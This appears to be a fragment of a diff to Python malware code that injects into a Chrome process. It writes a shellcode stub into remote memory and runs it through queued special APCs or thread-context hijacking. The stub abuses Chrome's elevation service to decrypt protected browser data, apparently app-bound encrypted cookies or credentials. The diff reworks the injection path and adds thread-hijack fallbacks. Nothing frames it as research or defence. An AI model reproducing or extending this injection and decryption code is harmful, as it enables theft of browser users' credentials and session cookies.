-        ntdll.NtQueueApcThreadEx2.restype = ctypes.c_long
-    access = 0x0010 | 0x0020 | 0x0008 | 0x0002 | 0x0400 | 0x1000 | 0x0200
-    handle = k32.OpenProcess(access, False, int(pid))
+    _bind_elevator_winapi(k32, ntdll)
+    handle = _elevator_open_process(k32, pid)
     if not handle:
-        return None, export_hr or f"crt:err={_win32_err() or 'open'}"
+        return None, export_hr or _apc_q_err(_win32_err() or "open")
+    threads: list[Any] = []
     try:
         coinit_fn = _remote_export_addr(k32, handle, "ole32.dll", "CoInitializeEx")
         cocreate = _remote_export_addr(k32, handle, "ole32.dll", "CoCreateInstance")
         blanket = _remote_export_addr(k32, handle, "ole32.dll", "CoSetProxyBlanket")
-        alert = _remote_export_addr(k32, handle, "ntdll.dll", "NtTestAlert")
+        nt_test_alert = _remote_export_addr(k32, handle, "ntdll.dll", "NtTestAlert")
         if not coinit_fn or not cocreate:
-            return None, export_hr or "crt:err=ole32"
+            return None, export_hr or "apc:q:err=ole32"
         try:
             clsid = _guid_bytes(clsid_s)
             iid = _guid_bytes(iid_s)
         except (AttributeError, OSError, ValueError, TypeError):
-            return None, export_hr or "crt:err=guid"
+            return None, export_hr or "apc:q:err=guid"
         stub = _elevator_remote_stub_bytes()
         out_max = 256
         page_size = 4096
@@ -6179,7 +6277,8 @@ def _chrome_elevator_decrypt_once(
         block[0x50:0x58] = int(bstr_data).to_bytes(8, "little")
         block[0x58:0x5C] = len(payload).to_bytes(4, "little")
         block[0x60:0x68] = int(bstr_data).to_bytes(8, "little")
-        block[0x78:0x7C] = (0xFFFFFFFF).to_bytes(4, "little")
+        block[0x68:0x6C] = int(flag).to_bytes(4, "little")
+        block[0x78:0x7C] = _ELEV_PENDING_HR.to_bytes(4, "little")
         block[0x80:0x88] = int(page + out_off).to_bytes(8, "little")
         block[0x88:0x8C] = int(out_max).to_bytes(4, "little")
         block[bstr_off : bstr_off + 4] = len(payload).to_bytes(4, "little")
@@ -6206,82 +6305,46 @@ def _chrome_elevator_decrypt_once(
             pass
         _cfg_register_call_target(k32, handle, page, stub_off, page_size)
         stub_addr = page + stub_off
-        queued = False
+        threads = _open_existing_threads(k32, pid, limit=4)
+        if not threads:
+            return None, export_hr or _apc_q_err(_cache.get("_elev_q_err") or "nothread")
         last_status = 0
-        special = 1
-        thread_access = 0x0010 | 0x0002 | 0x0040
-        if hasattr(ntdll, "NtQueueApcThreadEx2"):
-            for tid in _threads_for_pid(int(pid))[:8]:
-                th = k32.OpenThread(thread_access, False, tid)
-                if not th:
-                    continue
-                try:
-                    status = int(
-                        ntdll.NtQueueApcThreadEx2(
-                            th,
-                            None,
-                            special,
-                            ctypes.c_void_p(stub_addr),
-                            ctypes.c_void_p(page),
-                            None,
-                            None,
-                        )
-                    )
-                    last_status = status
-                    if status >= 0:
-                        queued = True
-                finally:
-                    k32.CloseHandle(th)
-        if not queued:
-            start = alert or stub_addr
-            tid = wintypes.DWORD(0)
-            thread = k32.CreateRemoteThread(
-                handle, None, 0, start, None, 0x4, ctypes.byref(tid)
-            )
-            if not thread:
-                return None, export_hr or f"crt:err={_win32_err() or last_status or 'crt'}"
-            try:
-                k32.SetThreadContext.argtypes = [wintypes.HANDLE, ctypes.c_void_p]
-                k32.SetThreadContext.restype = wintypes.BOOL
-                k32.GetThreadContext.argtypes = [wintypes.HANDLE, ctypes.c_void_p]
-                k32.GetThreadContext.restype = wintypes.BOOL
-                k32.TerminateThread.argtypes = [wintypes.HANDLE, wintypes.DWORD]
-                k32.TerminateThread.restype = wintypes.BOOL
-                if start != stub_addr:
-                    ctx_flags, ctx_rcx, ctx_rip = 0x30, 0x80, 0xF8
-                    ctx = (ctypes.c_char * 1232)()
-                    flag = (0x100003).to_bytes(4, "little")
-                    ctx[ctx_flags : ctx_flags + 4] = flag
-                    if not k32.GetThreadContext(thread, ctx):
-                        k32.TerminateThread(thread, 0)
-                        return None, export_hr or f"crt:err={_win32_err() or 'ctx'}"
-                    ctx[ctx_rcx : ctx_rcx + 8] = int(page).to_bytes(8, "little")
-                    ctx[ctx_rip : ctx_rip + 8] = int(stub_addr).to_bytes(8, "little")
-                    ctx[ctx_flags : ctx_flags + 4] = flag
-                    if not k32.SetThreadContext(thread, ctx):
-                        k32.TerminateThread(thread, 0)
-                        return None, export_hr or f"crt:err={_win32_err() or 'stx'}"
-                k32.ResumeThread(thread)
-                k32.WaitForSingleObject(thread, 3000)
-            finally:
-                k32.CloseHandle(thread)
-        else:
-            deadline = time.monotonic() + 2.0
-            while time.monotonic() < deadline:
-                peek = (ctypes.c_char * 4)()
-                if k32.ReadProcessMemory(
-                    handle, page + 0x78, peek, 4, ctypes.byref(wrote)
-                ) and int.from_bytes(bytes(peek), "little") != 0xFFFFFFFF:
-                    break
-                time.sleep(0.05)
+        queued = False
+        deadline = time.monotonic() + max(0.2, float(budget_s))
+        rsp = ((page + 0x800 + 512) & ~0xF) - 8
+        for th in threads:
+            if time.monotonic() >= deadline:
+                break
+            status = _queue_special_apc(ntdll, k32, th, stub_addr, page, 0, 0)
+            last_status = status
+            if status == 0:
+                queued = True
+                _alert_existing_thread(ntdll, k32, th, int(nt_test_alert or 0))
+                wait_until = min(deadline, time.monotonic() + 0.45)
+                while time.monotonic() < wait_until:
+                    peek = (ctypes.c_char * 4)()
+                    if k32.ReadProcessMemory(
+                        handle, page + 0x78, peek, 4, ctypes.byref(wrote)
+                    ) and int.from_bytes(bytes(peek), "little") != _ELEV_PENDING_HR:
+                        break
+                    time.sleep(0.04)
+                break
+            remain = max(0.15, deadline - time.monotonic())
+            if _hijack_existing_thread(
+                k32, handle, th, stub_addr, page, 0, 0, 0, rsp, b"", remain
+            ) is not None:
+                queued = True
+                break
         hr_buf = (ctypes.c_char * 4)()
         if not k32.ReadProcessMemory(
             handle, page + 0x78, hr_buf, 4, ctypes.byref(wrote)
         ):
-            return None, export_hr or "crt:err=hr"
+            return None, export_hr or _apc_q_err("hr")
         hr = int.from_bytes(bytes(hr_buf), "little")
-        if hr == 0xFFFFFFFF:
-            return None, export_hr or f"crt:err={last_status or 'dead'}"
+        if hr == _ELEV_PENDING_HR or hr == 0xFFFFFFFF:
+            if queued:
+                return None, export_hr or "apc:q:err=pending"
+            return None, export_hr or _apc_q_err(last_status or "pending")
         if hr & 0x80000000:
             return None, _elev_hr_token(hr)
         err_buf = (ctypes.c_char * 4)()
@@ -6302,8 +6365,9 @@ def _chrome_elevator_decrypt_once(
             return None, f"elev:len={n}"
         return bytes(out), f"elev:len={n}"
     except (AttributeError, OSError, ValueError, TypeError, OverflowError) as exc:
-        return None, export_hr or f"crt:err={type(exc).__name__}"
+        return None, export_hr or _apc_q_err(type(exc).__name__)
     finally:
+        _close_thread_list(k32, threads)
         k32.CloseHandle(handle)
 
 
